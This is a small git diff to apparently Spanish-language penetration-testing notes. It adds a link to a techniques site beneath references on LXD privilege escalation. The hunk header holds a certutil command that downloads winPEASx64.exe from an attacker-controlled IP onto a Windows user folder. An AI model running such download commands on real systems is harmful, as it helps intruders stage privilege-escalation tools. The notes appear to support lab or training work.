@@ -117,3 +117,6 @@ certutil -urlcache -split -f http://192.168.200.3/winPEASx64.exe C:\Users\hacker
 [HackTricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation)
 [Juggernaut](https://juggernaut-sec.com/lxd-container/)
 
+## Página con muchas técnicas y ejemplos
+
+[LostSec](https://lostsec.xyz)
